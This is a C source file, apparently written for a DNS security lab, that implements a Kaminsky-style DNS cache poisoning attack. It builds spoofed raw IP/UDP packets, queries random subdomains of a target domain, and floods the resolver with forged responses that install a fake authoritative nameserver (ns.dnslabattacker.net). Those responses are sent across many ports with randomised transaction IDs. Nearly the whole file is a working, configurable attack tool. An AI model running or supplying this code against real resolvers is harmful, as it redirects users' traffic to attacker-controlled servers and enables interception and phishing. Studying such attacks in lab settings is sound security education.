/**********************************************
 *  Author: HanBing
 *  Time: 9 / 12 / 2020 
 **********************************************/

// Includes
#include <stdio.h>
#include <time.h>
#include <stdlib.h>
#include <string.h>
#include <stdbool.h>
#include <libnet.h>

// Some Macro

#define PACKET_LEN 8192         // Packet Length
#define FLAG_QUERY 0x0100       // DNS Query Message Flags
#define FLAG_RESPONSE 0x8400    // DNS Response Message Flags

typedef unsigned char byte;
typedef unsigned short word;
typedef unsigned int dword;


// Define IP header, UDP Header, DNS Header and RRSet
struct IPHeader {
    byte iph_internet_header_length: 4, iph_version: 4;
    byte iph_type_of_service;
    word iph_total_length;
    word iph_identification;
    // byte iph_flags;                          // with iph_fragment_offset
    word iph_fragment_offset;
    byte iph_ttl;
    byte iph_protocol;
    word iph_checksum;
    dword iph_source_ip;
    dword iph_dest_ip;
};

struct UDPHeader {
    word udp_sport;
    word udp_dport;
    word udp_length;
    word udp_checksum;
};

struct DNSHeader {
    word transaction_id;
    word flags;
    word questions_count;
    word answers_count;
    word authority_count;
    word additional_count;
};

struct DataEnd {
    word type;
    word class;
};

struct ResourceRecordFixed {
    word type;
    word class;
    word ttl_l;
    word ttl_h;
    word data_length;
};

void show_hex(byte *buffer, unsigned long offset) {
    for (int i = 0; i < offset; ++i) {
        if (i % 16 == 0 && i != 0) {
            printf("\n");
        }
        printf("%02x ", buffer[i]);
    }
    printf("\n");
}

unsigned int checksum(uint16_t *usBuff, int isize) {
    unsigned int cksum = 0;
    for (; isize > 1; isize -= 2) {
        cksum += *usBuff++;
    }
    if (isize == 1) {
        cksum += *(uint16_t *) usBuff;
    }
    return cksum;
}


uint16_t check_udp_sum(uint8_t *buffer, unsigned int len) {
    unsigned long sum;
    struct IPHeader *tempI = (struct IPHeader *) (buffer);
    struct UDPHeader *tempH = (struct UDPHeader *) (buffer + sizeof(struct IPHeader));
    tempH->udp_checksum = 0;
    sum = checksum((uint16_t *) &(tempI->iph_source_ip), 8);
    sum += checksum((uint16_t *) tempH, len);
    sum += ntohs(IPPROTO_UDP + len);
    sum = (sum >> 16) + (sum & 0x0000ffff);
    sum += (sum >> 16);
    return (uint16_t) (~sum);
}


unsigned short csum(unsigned short *buf, int nwords) {
    unsigned long sum;
    for (sum = 0; nwords > 0; nwords--)
        sum += *buf++;
    sum = (sum >> 16) + (sum & 0xffff);
    sum += (sum >> 16);
    return (unsigned short) (~sum);
}


/*
 * Function: make dns message header
 * to write a dns message header in buffer and set offset
 * */
void make_dns_message_header(byte *buffer, unsigned long *offset,
                             char *src_ip, char *dest_ip, word sport, word dport,
                             word flags, word q_count, word an_count, word au_count,
                             word ad_count, struct IPHeader **ip, struct UDPHeader **udp,
                             struct DNSHeader **dns) {
    // locate
    unsigned long _offset = 0;
    *ip = (struct IPHeader *) buffer;
    _offset += sizeof(struct IPHeader);
    *udp = (struct UDPHeader *) (buffer + _offset);
    _offset += sizeof(struct UDPHeader);
    *dns = (struct DNSHeader *) (buffer + _offset);
    _offset += sizeof(struct DNSHeader);
    // fill dns header
    // (*dns)->transaction_id = htons(random() % (0xffff + 1));
    (*dns)->flags = htons(flags);
    (*dns)->questions_count = htons(q_count);
    (*dns)->answers_count = htons(an_count);
    (*dns)->authority_count = htons(au_count);
    (*dns)->additional_count = htons(ad_count);
    // fill udp header(no checksum or length)
    (*udp)->udp_sport = htons(sport);
    (*udp)->udp_dport = htons(dport);
    // fill ip header (no checksum or total length)
    (*ip)->iph_internet_header_length = 5;
    (*ip)->iph_version = 4;
    (*ip)->iph_type_of_service = 0;
    // (*ip)->iph_identification = htons(random() % (0xffff + 1));
    // (*ip)->iph_identification = htons(0x7886);
    (*ip)->iph_ttl = 128; //hops
    (*ip)->iph_protocol = 0x11; //udp
    (*ip)->iph_source_ip = inet_addr(src_ip);
    (*ip)->iph_dest_ip = inet_addr(dest_ip);
    *offset += _offset;
}

void add_query(byte *buffer, char *name, word class, word type, unsigned long *offset) {
    // fill dns query section
    strcpy((char *) buffer, name);
    struct DataEnd *data_end = (struct DataEnd *) (buffer + strlen(name) + 1);
    data_end->class = htons(class);
    data_end->type = htons(type);
    *offset += strlen(name) + 5; // len(name) + 1(\0) + 4
}

void add_resource_record(byte *buffer, char *name, word class, word type, word ttl_l, word ttl_h, word data_length,
                         char *data, unsigned long *offset) {
    strcpy((char *) buffer, name);
    struct ResourceRecordFixed *rr_fixed = (struct ResourceRecordFixed *) (buffer + strlen(name) + 1);
    rr_fixed->class = htons(class);
    rr_fixed->type = htons(type);
    rr_fixed->ttl_h = htons(ttl_h);
    rr_fixed->ttl_l = htons(ttl_l);
    rr_fixed->data_length = htons(data_length);
    strcpy((char *) (buffer + strlen(name) + 1 + sizeof(struct ResourceRecordFixed)), data);
    if (data_length == 4) {
        *offset += strlen(name) + strlen(data) + sizeof(struct ResourceRecordFixed) + 1;
    } else {
        *offset += strlen(name) + strlen(data) + sizeof(struct ResourceRecordFixed) + 2;
    }
}


unsigned long make_dns_query_message(byte *buffer, char *src_ip, char *dest_ip,
                                     char *name, word sport, word dport) {
    unsigned long offset = 0;
    struct IPHeader *ip = NULL;
    struct UDPHeader *udp = NULL;
    struct DNSHeader *dns = NULL;
    make_dns_message_header(buffer, &offset, src_ip, dest_ip, sport, dport, FLAG_QUERY, 1, 0, 0, 0, &ip, &udp, &dns);
    add_query(buffer + offset, name, 1, 1, &offset);
    ip->iph_total_length = htons(offset);
    udp->udp_length = htons(offset - sizeof(struct IPHeader));
    ip->iph_checksum = csum((unsigned short *) buffer, sizeof(struct IPHeader) / 2);
    udp->udp_checksum = check_udp_sum(buffer, offset - sizeof(struct IPHeader));
    // show_hex(buffer, offset);
    return offset;
}


unsigned long make_dns_response_message(byte *buffer, char *src_ip, char *dest_ip,
                                        char *name, word sport, word dport, char *domain, char *ns_name,
                                        char *fake_ns_ip) {
    unsigned long offset = 0;
    struct IPHeader *ip = NULL;
    struct UDPHeader *udp = NULL;
    struct DNSHeader *dns = NULL;
    make_dns_message_header(buffer, &offset, src_ip, dest_ip, sport, dport, FLAG_RESPONSE, 1, 1, 1, 1, &ip, &udp, &dns);
    add_query(buffer + offset, name, 1, 1, &offset);
    char *temp = "\1\1\1\1";
    add_resource_record(buffer + offset, name, 1, 1, 0x0020, 0x0041, 4, temp, &offset);
    add_resource_record(buffer + offset, domain, 1, 2, 0x0020, 0x0041, strlen(ns_name) + 1, ns_name, &offset);
    add_resource_record(buffer + offset, ns_name, 1, 1, 0x0020, 0x0041, 4, fake_ns_ip, &offset);
    // printf("base dns query message construct!, offset=%ld\n", offset);
    ip->iph_total_length = htons(offset);
    udp->udp_length = htons(offset - sizeof(struct IPHeader));
    ip->iph_checksum = csum((unsigned short *) buffer, sizeof(struct IPHeader) / 2);
    udp->udp_checksum = check_udp_sum(buffer, offset - sizeof(struct IPHeader));
    return offset;
}
bool convert_name(char *str, char **_ret) {
    size_t _size = strlen(str);
    if(str[_size - 1] != '.'){
        printf("ERROR: The name given is not end with `.`!\n");
        return false;
    }
    if (_size <= 0) {
        printf("ERROR: The length of the str given is INVALID!\n");
        return false;
    } else {
        *_ret = (char *) calloc((_size + 10), sizeof(char));
        if (*_ret) {
            char _c = 0;
            int _len_pointer = 0;
            int _str_pointer = 0;
            int _ret_pointer = 1;
            while (str[_str_pointer] != '\0') {
                if (str[_str_pointer] == '.') {
                    (*_ret)[_len_pointer] = _c;
                    _len_pointer = _ret_pointer;
                    _ret_pointer++;
                    _str_pointer++;
                    _c = 0;
                } else {
                    (*_ret)[_ret_pointer++] = str[_str_pointer++];
                    _c++;
                }
            }
            return true;
        } else {
            printf("ERROR: Alloc return String space FAIL! Length: %ld!\n", _size);
            return false;
        }
    }
}


bool get_parent_domain(char *_str, char **_ret, bool _name_need_convert) {
    unsigned char i = 0;
    while (_str[i] != '\0') {
        while (_str[i++] != '.');
        break;
    }
    *_ret = _str + i;
    bool _ori_ret = **_ret != '\0';
    if(_ori_ret){
        if(_name_need_convert){
            return convert_name(*_ret, _ret);
        }else{
            return _ori_ret;
        }
    }else{
        return _ori_ret;
    }
}

bool convert_ip(const char *_str, unsigned char **_ret) {
    (*_ret) = (unsigned char *) calloc(5, sizeof(char));
    if (*_ret) {
        unsigned char _pointer = 0;
        unsigned char _temp = 0;
        for (unsigned char _i = 0; _str[_i] != '\0'; ++_i) {
            if (_str[_i] == '.') {
                (*_ret)[_pointer++] = _temp;
                _temp = 0;
            } else {
                _temp *= 10;
                _temp += _str[_i] - 0x30;
            }
        }
        (*_ret)[_pointer] = _temp;
        return true;
    } else {
        puts("ERROR: Convert to 32-bit word from IP string!, Alloc space error!");
        return false;
    }
}
void poison(char *user_ip, char *authority_ip, char *target_ip,
            char *_name, char *domain, char *authority_name, char *fake_authority_ip,
            unsigned int _name_count, const unsigned short *_ports, unsigned short _port_num, 
            const unsigned short _start, const unsigned short _interval, 
            const unsigned short _send_times
) {
    printf("INFO: user's ip: %s\n", user_ip);
    printf("INFO: authority's ip: %s\n", authority_ip);
    printf("INFO: target ip: %s\n", target_ip);
    printf("INFO: origin name: %s\n", _name);
    printf("INFO: domain: %s\n", domain);
    printf("INFO: authority's name: %s\n", authority_name);
    printf("INFO: fake authority's ip: %s\n", fake_authority_ip);
    printf("INFO: test count: %d\n", _name_count);
    printf("INFO: port scale: [%d, %d]\n", _start, _start + _port_num);
    printf("INFO: port's count: %u\n", _port_num);
    printf("INFO: name's count: %u\n", _name_count);
    printf("INFO: interval: %u\n", _interval);
    printf("INFO: send times per random name: %u\n", _send_times);
    char *real_name, *real_domain, *real_auth_name, *real_given_auth_ip;
    byte query_buffer[PACKET_LEN];
    byte response_buffer[PACKET_LEN];
    if(convert_name(_name, &real_name) && convert_name(domain, &real_domain) &&
       convert_name(authority_name, &real_auth_name) && convert_ip(fake_authority_ip, (unsigned char**)&real_given_auth_ip)){
           puts("INFO: Convert Success!");
    }else{
        puts("ERROR: Convert name from default to given failed!");
        return;
    }
    char *charset = "qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM1234567890";
    char name[255];
    strcpy(name, _name);
    struct sockaddr_in sin;
    sin.sin_addr.s_addr = inet_addr(target_ip);
    const int val = 1;
    int sd = socket(PF_INET, SOCK_RAW, IPPROTO_UDP);
    if (sd < 0) {
        printf("ERROR: Create Socket Error!\n");
        exit(-1);
    }
    printf("INFO: Create Socket!\n");
    if (setsockopt(sd, IPPROTO_IP, IP_HDRINCL, &val, sizeof(int)) < 0) {
        printf("ERROR: \n");
        exit(-2);
    }
    struct IPHeader *query_ip = (struct IPHeader *) query_buffer;
    struct UDPHeader *query_udp = (struct UDPHeader *) (query_buffer + sizeof(struct IPHeader));
    struct DNSHeader *query_dns = (struct DNSHeader *) (query_buffer + sizeof(struct IPHeader) +
                                                        sizeof(struct UDPHeader));
    struct IPHeader *response_ip = (struct IPHeader *) response_buffer;
    struct UDPHeader *response_udp = (struct UDPHeader *) (response_buffer + sizeof(struct IPHeader));
    struct DNSHeader *response_dns = (struct DNSHeader *) (response_buffer + sizeof(struct IPHeader) +
                                                           sizeof(struct UDPHeader));
    srand(time(0));
    for (int i = 0; i < _name_count; ++i) {
        unsigned long query_packet_length = make_dns_query_message(query_buffer, user_ip, target_ip, real_name,
                                                                   random() % (0xffff + 1), 53);
        unsigned long response_packet_length = make_dns_response_message(response_buffer, authority_ip, target_ip, real_name,
                                                                         53, 33333, real_domain, real_auth_name,
                                                                         real_given_auth_ip);
        // send query
        query_dns->transaction_id = random() % (0xffff + 1);
        query_ip->iph_identification = random() % (0xffff + 1);
        query_udp->udp_checksum = check_udp_sum(query_buffer, ntohs(query_udp->udp_length));
        sendto(sd, query_buffer, query_packet_length, 0, (struct sockaddr *) &sin, sizeof(sin));
        // send response
        // todo shuffle txid
        // inner random mode
        for (size_t j = random() % _port_num; j < _port_num; ++j) {
            response_udp->udp_dport = htons(_ports[j]);
            for (int k = 0; k < _send_times; ++k) {
                response_dns->transaction_id = random() % (0xffff + 1);
                response_ip->iph_identification = random() % (0xffff + 1);
                response_udp->udp_checksum = check_udp_sum(response_buffer, ntohs(response_udp->udp_length));
                sendto(sd, response_buffer, response_packet_length, 0, (struct sockaddr *) &sin, sizeof(sin));
            }
        }
        usleep(_interval);
        // random fake name in domain
        real_name[random() % 3 + 1] = charset[random() % 62];
        real_name[random() % 2 + 3] = charset[random() % 62];
        printf("INFO: change new name: %5.5s.%s\n", real_name + 1, domain);
    }
}


void shuffle(unsigned short *_array, size_t size, void _callback(unsigned short *, size_t)) {
    // 经典洗牌算法
    unsigned short index = 0;
    unsigned short temp = 0;
    for (size_t i = 0; i < size; ++i) {
        index = random() % size;
        temp = _array[i];
        _array[i] = _array[index];
        _array[index] = temp;
    }
    _callback(_array, size);
}

void do_nothing_call_back(unsigned short *_array, size_t _size) {

}

size_t set_ordered_array(unsigned short *_array,
                         unsigned short _start, unsigned short _step, unsigned short _count) {
    size_t count = 0;
    for (int i = _start; count < _count; i += _step) {
        _array[count++] = i;
    }
    return count;
}

void show_u_short_array(unsigned short *_array, size_t _size) {
    for (int i = 0; i < _size; ++i) {
        printf("%5d ", _array[i]);
        if (i % 8 == 7) {
            printf("\n");
        }
    }
    printf("\n");
}


int main(int argc, char *argv[]) {
    char *_ret;
    char *default_origin_name = "abcde.example.com.";
    char *default_domain_name = "example.com.";
    char *default_auth_name = "ns.dnslabattacker.net.";
    char *default_fake_auth_ip = "1.1.1.1";
    unsigned int name_count = 100000;
    unsigned short interval = 100; 
    unsigned short send_times = 100;
    unsigned short ports[65536];
    unsigned short port_count = 0;
    unsigned short _start;
    unsigned short _end;
    char *stop_string;
    char *real_domain_name;
    switch (argc) {
        case 1:
        case 2:
        case 3:
            puts("Warning: the count of arguments must be greater than 3!");
            puts("Usage: dns_cache_poison.out user_ip authority_ip target_ip [port_min] [port_max] [origin_name] [domain_name] [authority_name] [fake_authority_name] [name_count] [interval] [send_times]");
            break;
        case 4:
            port_count = 65535 - 1024;
            set_ordered_array(ports, 1024, 1, port_count);
            shuffle(ports, port_count, do_nothing_call_back);
            poison(argv[1], argv[2], argv[3], default_origin_name, default_domain_name, default_auth_name,
                   default_fake_auth_ip, name_count, ports, port_count, 1024, interval, send_times);
            break;
        case 5:
            puts("Warning: the max port wasn't be given, default to 65535");
            _start = strtol(argv[4], &stop_string, 10);
            port_count = 65535 - _start;
            set_ordered_array(ports, _start, 1, port_count);
            shuffle(ports, port_count, do_nothing_call_back);
            poison(argv[1], argv[2], argv[3], default_origin_name, default_domain_name, default_auth_name,
                   default_fake_auth_ip, name_count, ports, port_count, _start, interval, send_times);
            break;
        case 6:
            _start = strtol(argv[4], &stop_string, 10);
            _end = strtol(argv[5], &stop_string, 10);
            port_count = _end - _start;
            set_ordered_array(ports, _start, 1, port_count);
            shuffle(ports, port_count, show_u_short_array);
            poison(argv[1], argv[2], argv[3], default_origin_name, default_domain_name, default_auth_name,
                   default_fake_auth_ip, name_count, ports, port_count, _start, interval, send_times);
            break;
        case 7:
            _start = strtol(argv[4], &stop_string, 10);
            _end = strtol(argv[5], &stop_string, 10);
            port_count = _end - _start;
            set_ordered_array(ports, _start, 1, port_count);
            shuffle(ports, port_count, do_nothing_call_back);
            if(get_parent_domain(argv[6], &real_domain_name, false)){
                printf("ERROR: Get the parent domain of the name FAIL!");
            }
            poison(argv[1], argv[2], argv[3], argv[6], real_domain_name, default_auth_name,
                default_fake_auth_ip, name_count, ports, port_count, _start, interval, send_times);
            break;  
        case 8:
            _start = strtol(argv[4], &stop_string, 10);
            _end = strtol(argv[5], &stop_string, 10);
            port_count = _end - _start;
            set_ordered_array(ports, _start, 1, port_count);
            shuffle(ports, port_count, do_nothing_call_back);
            poison(argv[1], argv[2], argv[3], argv[6], argv[7], default_auth_name,
                default_fake_auth_ip, name_count, ports, port_count, _start, interval, send_times);
            break;
        case 9:
            _start = strtol(argv[4], &stop_string, 10);
            _end = strtol(argv[5], &stop_string, 10);
            port_count = _end - _start;
            set_ordered_array(ports, _start, 1, port_count);
            shuffle(ports, port_count, do_nothing_call_back);
            poison(argv[1], argv[2], argv[3], argv[6], argv[7], argv[8],
                default_fake_auth_ip, name_count, ports, port_count, _start, interval, send_times);
            break;
        case 10:
            _start = strtol(argv[4], &stop_string, 10);
            _end = strtol(argv[5], &stop_string, 10);
            port_count = _end - _start;
            set_ordered_array(ports, _start, 1, port_count);
            shuffle(ports, port_count, do_nothing_call_back);
            poison(argv[1], argv[2], argv[3], argv[6], argv[7], argv[8],
                argv[9], name_count, ports, port_count, _start, interval, send_times);
            break;
        case 11:
            _start = strtol(argv[4], &stop_string, 10);
            _end = strtol(argv[5], &stop_string, 10);
            name_count = strtol(argv[10], &stop_string, 10);
            port_count = _end - _start;
            set_ordered_array(ports, _start, 1, port_count);
            shuffle(ports, port_count, do_nothing_call_back);
            poison(argv[1], argv[2], argv[3], argv[6], argv[7], argv[8],
                argv[9], name_count, ports, port_count, _start, interval, send_times);
            break;
        case 12:
            _start = strtol(argv[4], &stop_string, 10);
            _end = strtol(argv[5], &stop_string, 10);
            name_count = strtol(argv[10], &stop_string, 10);
            interval = strtol(argv[11], &stop_string, 10);
            port_count = _end - _start;
            set_ordered_array(ports, _start, 1, port_count);
            shuffle(ports, port_count, do_nothing_call_back);
            poison(argv[1], argv[2], argv[3], argv[6], argv[7], argv[8],
                argv[9], name_count, ports, port_count, _start, interval, send_times);
            break;
        case 13:
            _start = strtol(argv[4], &stop_string, 10);
            _end = strtol(argv[5], &stop_string, 10);
            name_count = strtol(argv[10], &stop_string, 10);
            interval = strtol(argv[11], &stop_string, 10);
            send_times = strtol(argv[12], &stop_string, 10);
            port_count = _end - _start;
            set_ordered_array(ports, _start, 1, port_count);
            shuffle(ports, port_count, do_nothing_call_back);
            poison(argv[1], argv[2], argv[3], argv[6], argv[7], argv[8],
                argv[9], name_count, ports, port_count, _start, interval, send_times);
            break;
        default:
            break;
    }
    return 0;
}
